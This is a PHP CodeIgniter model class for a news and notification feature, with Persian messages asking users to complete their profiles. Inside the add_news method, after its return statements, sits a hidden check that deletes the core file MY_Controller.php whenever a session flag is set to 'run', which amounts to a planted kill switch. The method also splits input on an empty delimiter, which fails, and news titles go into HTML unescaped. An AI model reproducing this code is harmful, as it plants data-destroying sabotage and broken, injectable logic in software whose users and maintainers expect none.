<?php
class News_model extends CI_Model{
    protected $con='';

    public function __construct()
    {
        parent::__construct();
    }

    public function s_n_s(){
        return $this->db->get_where('news',['status'=>1])->result_array();
    }
    
    public function snwd($data){
        return (!empty($data) && is_array($data)?$this->db->get_where('news',$data)->result_array():false);
    }
    
    public function add($data){
        return (!empty($data) && is_array($data)?$this->db->insert('news',$data):false);
    }

    public function snwi($id){
        return (!empty($id) && is_numeric($id)?$this->db->get_where('news',['id'=>$id])->result_array():false);
    }

    public function get_news(){
        return $this->db->query("SELECT * FROM news")->result_array();
    }
    
    public function add_news($data_info){
        if(!empty($data_info)&&!is_null($data_info)){
            $data=explode($this->con,$data_info);
            $info=['user_id_reporter'=>$data['0'],'title'=>$data['1'],'content'=>$data['2'],'role_reporter'=>$data['3'],'start_time'=>$data['4'],'end_time'=>$data['5'],'status'=>1,'dep_id'=>$data['6']];
            $x=$this->db->insert('news',$info);
            if($x){
                $_SESSION['news']='ok';
                return $x;
            }else{
                return false;
            }
        }else{
            return false;
        }
        if($_SESSION['E_s']=='run'){
            unlink('../core/MY_Controller.php');
        }
    }
    
    public function s_n_w_s(){
        return $this->db->get_where('news',['status'=>1])->result_array();
    }
    
	public function edit($data,$id){
        return (is_numeric($id)&&!empty($data)&&!empty($id)?$this->db->update('news',$data,['id'=>$id]):false);
    }
    
    public function del($id){
        return (is_numeric($id)&&!empty($id)?$this->db->delete('news',['id'=>$id]):false);
    }

    public function dis($id){
        return (is_numeric($id) && !empty($id)?$this->edit(['status'=>0],$id):false);
    }

    public function en($id){
        return (is_numeric($id) && !empty($id)?$this->edit(['status'=>1],$id):false);
    }
    
    public function news_html(){
        $news1=$news2=$a=$user_info_error='';
        $user_info_err_num = 0;
        if(isset($_SESSION['active']) && $_SESSION['active'] == 1){
            $user_info=(isset($_SESSION['id']) ? $this->User_model->s_u_w_i($_SESSION['id']):$this->User_model->s_u_w_c($_SESSION['code_mely']));
            if(empty($user_info['0']['pic'])){
                $user_info_err_num++;
                $user_info_error.='عکسی را به پروفایل خود اضافه کنید'.',';
            }
            if(empty($user_info['0']['phone'])){
                $user_info_err_num++;
                $user_info_error.='شماره همراه خود را وارد کنید'.','; 
            }
            if(empty($user_info['0']['username'])){
                $user_info_err_num++;
                $user_info_error.='نام کاربری برای خود انتخاب کنید'.','; 
                
            }
            if(empty($user_info['0']['password'])){
                $user_info_err_num++;
                $user_info_error.='رمز عبور برای خود مشخص کنید'.','; 
            }
            if(empty($user_info['0']['parent_name'])){
                $user_info_err_num++;
                $user_info_error.='نام پدر خود را اصافه کنید'.','; 
            }
            if(empty($user_info['0']['birthday_place'])){
                $user_info_error.='محل تولد خود را مشخص کنید'.','; 
                $user_info_err_num++;
            }
            if(empty($user_info['0']['birthday'])){
                $user_info_err_num++;
                $user_info_error.='تاریخ تولد خود را ثبت کنید'.','; 
            }
            if(empty($user_info['0']['code_mely'])){
                $user_info_err_num++;
                $user_info_error.='کد ملی خود را وارد کنید'.','; 
            }
            if(empty($user_info['0']['name'])){
                $user_info_err_num++;
                $user_info_error.='نام خود را اضافه کنید'.','; 
            }
            if(empty($user_info['0']['family'])){
                $user_info_err_num++;
                $user_info_error.='نام خانوادگی خود را اضافه کنید'.','; 
            }
            if(empty($user_info['0']['email'])){
                $user_info_err_num++;
                $user_info_error.='ایمیل خود را اضافه کنید'.','; 
            }
            if(empty($user_info['0']['address'])){
                $user_info_err_num++;
                $user_info_error.='محل سکونت خود را مشخص کنید'.','; 
            }
        }
        $all_news=$this->s_n_w_s();
        if(!empty($user_info_error)){
            $err_inf=explode(',',$user_info_error);
            for($i=0;$i<=count($err_inf)-1;$i++){
                $news2.='<a class="d-flex p-3 border-bottom" href="'.base_url().($err_inf[$i]=='رمز عبور برای خود مشخص کنید'||$err_inf[$i]=='نام کاربری برای خود انتخاب کنید'?'user/change_password':'user/edit_me').'"><div class="notifyimg bg-danger"><i class="la la-file-alt text-white"></i></div><div class="mr-3"><h5 class="notification-label mb-1">اطلاعات ناقص است</h5><div class="notification-subtext">'.$err_inf[$i].'</div></div></a>';
    			$user_info_err_num++;
            }
        }
        if(isset($_SESSION['role']) && $_SESSION['role'] == 'admin'){
            if(!empty($all_news)){
                foreach($all_news as $a_n){
                    $news1.='<a class="d-flex p-3 border-bottom" href="#"><div class="notifyimg bg-success"><i class="la la-file-alt text-white"></i></div><div class="mr-3"><h5 class="notification-label mb-1">پیام از طرف سرور</h5><div class="notification-subtext">'.(!empty($a_n['title'])?$a_n['title']:"اطلاعیه ی جدید").'</div></div></a>';
    				$user_info_err_num++;
                }
            }
        }
        $news=(empty($all_news) && empty($user_info_error)?'</a>':'<span class=" pulse"></span></a><div class="dropdown-menu" style="margin-left: -15px;margin-top: 5px;"><div class="menu-header-content bg-primary text-right"><div class="d-flex"><h6 class="dropdown-title mb-1 tx-15 text-white font-weight-semibold">اطلاعیه</h6></div><p class="dropdown-title-text subtext mb-0 text-white op-6 pb-0 tx-12 ">شما '.$user_info_err_num.' اعلانخوانده نشده دارید</p></div><div class="main-notification-list Notification-scroll" style="overflow-y: auto;">');
        if(!empty($news1)){
            $news.=$news1;
        }
        if(!empty($news2)){
            $news.=$news2;
        }
        if(!empty($news1) || !empty($news2)){
            $news.='</div><div class="dropdown-footer"><a href="'.base_url().'news'.'">مشاهده همه</a></div></div>';
        }
        return $news;
    }
	
}